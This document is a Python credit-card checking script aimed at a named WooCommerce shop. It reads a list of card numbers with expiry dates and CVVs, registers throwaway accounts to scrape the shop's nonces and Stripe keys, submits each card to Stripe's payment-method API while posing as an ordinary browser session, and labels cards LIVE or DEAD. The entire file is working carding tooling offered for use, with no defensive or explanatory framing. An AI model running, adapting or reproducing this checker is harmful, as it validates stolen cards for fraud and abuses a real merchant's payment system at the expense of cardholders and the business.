import requests, re, random, string, colorama
from colorama import Fore, init
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

init(autoreset=True)

UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'

def check(card):
    s = requests.Session()
    s.mount('https://', HTTPAdapter(max_retries=Retry(total=3)))
    
    em = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
    
    try:
        cc, mm, yy, cv = card.split('|')
        h = {'user-agent': UA, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

        nc = None
        for _ in range(5):
            try:
                r1 = s.get('https://redbluechair.com/my-account/', headers=h, timeout=15)
                m = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
                if m: 
                    nc = m.group(1)
                    break
            except:
                pass
        
        if not nc: return {"st": "fail", "msg": "Nonce Error"}

        s.post('https://redbluechair.com/my-account/', headers=h, data={'email':em,'password':'Pass123!','woocommerce-register-nonce':nc,'register':'Register'})

        r2 = s.get('https://redbluechair.com/my-account/add-payment-method/', headers=h)

        sn = re.search(r'"createSetupIntentNonce"\s*:\s*"([a-zA-Z0-9]+)"', r2.text)
        pk = re.search(r'pk_live_[a-zA-Z0-9]+', r2.text)
        at = re.search(r'acct_[a-zA-Z0-9]+', r2.text)

        if not all([sn, pk, at]): return {"st": "fail", "msg": "Stripe Data Fetch Error"}

        h_s = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': UA}
        
        pay = f'billing_details[name]=+&billing_details[email]={em.replace("@", "%40")}&billing_details[address][country]=US&billing_details[address][postal_code]=10080&type=card&card[number]={cc}&card[cvc]={cv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F350609fece%3B+stripe-js-v3%2F350609fece%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fredbluechair.com&time_on_page=69770&client_attribution_metadata[client_session_id]=8389d56e-537f-457c-a11b-ff4bea7adf21&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=6fc8418e-d2e9-4ed9-9dea-c809747e44a0&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=6c6e46fb-ed66-4e96-ad1c-4601a6f97e390fbc51&muid=1738afd7-7425-4fc8-9b98-8282390d3df0e4ab79&sid=d98713dc-eff7-4bfb-887d-a344fff9c1b3898582&key={pk.group(0)}&_stripe_account={at.group(0)}'
        
        r3 = s.post('https://api.stripe.com/v1/payment_methods', headers=h_s, data=pay)
        pm = r3.json()
        if 'id' not in pm: return {"st": "fail", "msg": pm.get('error', {}).get('message', 'Stripe PM Error')}

        r4 = s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files={'action':(None,'create_setup_intent'),'wcpay-payment-method':(None,pm['id']),'_ajax_nonce':(None,sn.group(1))})
        return r4.json()
    except Exception as e: return {"st": "error", "msg": str(e)}

def run():
    file = input("Enter combo: ")
    try: cards = open(file, 'r').read().splitlines()
    except: print(f"{Fore.RED}File error"); return

    live = ["success\":true", "succeeded", "authorized", "requires_action", "payment_complete"]
    dc = ["declined", "card was declined"]

    for c in cards:
        if not c: continue
        res = check(c)
        r_s = str(res).lower()
        
        if any(t in r_s for t in live) and "error" not in r_s:
            print(f"{Fore.GREEN}[LIVE] {c} | {res}")
        elif any(d in r_s for d in dc):
            m = res.get('data',{}).get('error',{}).get('message','Declined') if isinstance(res,dict) else "Declined"
            print(f"{Fore.RED}[DEAD] {c} | {m}")
        else:
            print(f"{Fore.YELLOW}[FAIL] {c} | {res.get('msg','Error') if isinstance(res,dict) else 'Error'}")

if __name__ == "__main__":
    run()
